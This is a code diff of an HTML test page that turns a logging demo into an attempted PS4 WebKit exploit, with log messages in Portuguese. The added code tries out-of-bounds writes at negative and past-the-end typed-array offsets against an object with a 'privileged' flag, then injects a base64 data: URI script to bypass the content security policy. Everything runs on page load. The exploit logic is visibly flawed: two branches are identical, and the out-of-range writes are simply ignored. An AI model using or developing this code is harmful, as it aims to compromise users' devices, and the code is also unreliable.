@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit OOB Write + CSP Bypass - Debug Log</title>
+    <title>PS4 WebKit OOB Write + CSP Bypass - Debug OOB Write</title>
     <style>
         body {
             font-family: monospace;
@@ -22,7 +22,7 @@
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit OOB Write + CSP Bypass - Debug Log</h1>
+    <h1>PS4 WebKit OOB Write + CSP Bypass - Debug OOB Write</h1>
     <div id="output"></div>
     <script>
         const log = (message, type = 'info') => {
@@ -38,23 +38,81 @@
             }
         };
 
-        async function debugLogTest() {
-            log("Iniciando teste de log...", 'critical');
+        function prepareData() {
+            log("Função prepareData() iniciada.");
+            const bufferSize = 64;
+            const buffer = new ArrayBuffer(bufferSize);
+            const view = new Uint8Array(buffer);
 
-            log("Mensagem de informação.");
-            log("Mensagem de aviso.", 'warning');
-            log("Mensagem de sucesso.", 'success');
-            log("Mensagem de erro.", 'error');
-            log("Mensagem crítica.", 'critical');
+            const targetObject = {
+                flag1: true,
+                flag2: false,
+                counter: 10,
+                name: "Test",
+                array: [1, 2, 3],
+                floatValue: 3.14,
+                longValue: 1234567890123,
+                nestedObject: { a: 1, b: "hello" },
+                privileged: false,
+                bypassMethod: "default"
+            };
 
-            log("\n--- Preparação do objeto ---", 'warning');
-            const targetObject = { debug: true };
-            log(`Objeto de debug: ${JSON.stringify(targetObject)}`);
+            log(`Objeto inicial: ${JSON.stringify(targetObject)}`);
+            log(`Tamanho do buffer: ${bufferSize}`);
+            log("Função prepareData() concluída.");
+            return { targetObject, buffer, view, bufferSize };
+        }
+
+        async function targetedOOBWriteTests(targetObject, view, bufferSize) {
+            log("\n--- Testes de OOB Write Direcionados ---", 'warning');
+
+            const writeTargets = [
+                { offset: -20, value: 0x01020304 },
+                { offset: -12, value: 0x80808080 },
+                { offset: 0, value: 0xAABBCCDD },
+                { offset: 50, value: 0x11223344 },
+                { offset: 60, value: 0xFFEEDDCC },
+                { offset: 72, value: 0x12345678 },
+                { offset: -1, value: 0x90 },
+                { offset: bufferSize, value: 0xAA },
+                { offset: -24, value: 0x00000001 },
+                { offset: bufferSize + 16, value: 0x00000000 },
+            ];
+
+            const dataView = new DataView(view.buffer);
+
+            for (const target of writeTargets) {
+                const { offset, value } = target;
+                log(`Tentativa de escrita em offset ${offset} com valor 0x${value.toString(16)}`);
+                log(`Objeto ANTES da escrita: ${JSON.stringify(targetObject)}`);
+                try {
+                    if (offset >= 0 && offset + 3 < bufferSize && offset % 4 === 0) {
+                        dataView.setInt32(offset, value, true);
+                    } else if (offset >= 0 && offset < bufferSize) {
+                        view[offset] = value & 0xFF;
+                    } else {
+                        view[offset] = value & 0xFF;
+                    }
+                    log(`Objeto APÓS a escrita: ${JSON.stringify(targetObject)}`);
+                } catch (writeError) {
+                    log(`Erro na escrita em offset ${offset}: ${writeError}`, 'error');
+                }
+                await new Promise(resolve => setTimeout(resolve, 50));
+            }
+
+            log("--- Testes de OOB Write Direcionados Concluídos ---", 'warning');
+        }
+
+        async function debugOOBWriteTest() {
+            log("Iniciando teste de OOB Write...", 'critical');
+            const { targetObject, buffer, view, bufferSize } = prepareData();
+            await targetedOOBWriteTests(targetObject, view, bufferSize);
+            log("Teste de OOB Write concluído.", 'critical');
 
             log("\n--- Tentativa de Bypass CSP (simples) ---", 'warning');
             try {
                 const scriptDataURI = document.createElement('script');
-                scriptDataURI.src = 'data:text/javascript;base64,YWxlcnQoJ0xvZyBUZXN0IFN1Y2Nlc3MhJyk7'; // alert('Log Test Success!');
+                scriptDataURI.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gQ1NQIEJ5cGFzcyEgT09CIFdyaXRlIFRlc3QgQ29tcGxldGUhJyk7'; // alert('Vupun CSP Bypass! OOB Write Test Complete!');
                 scriptDataURI.onload = () => log("Bypass de CSP (simples) BEM-SUCEDIDO!", 'success');
                 scriptDataURI.onerror = () => log("Falha no Bypass de CSP (simples).", 'error');
                 document.body.appendChild(scriptDataURI);
@@ -62,11 +120,9 @@
             } catch (error) {
                 log(`Erro no bypass de CSP (simples): ${error}`, 'error');
             }
-
-            log("\nTeste de log concluído.", 'critical');
         }
 
-        document.addEventListener('DOMContentLoaded', debugLogTest);
+        document.addEventListener('DOMContentLoaded', debugOOBWriteTest);
     </script>
 </body>
 </html>
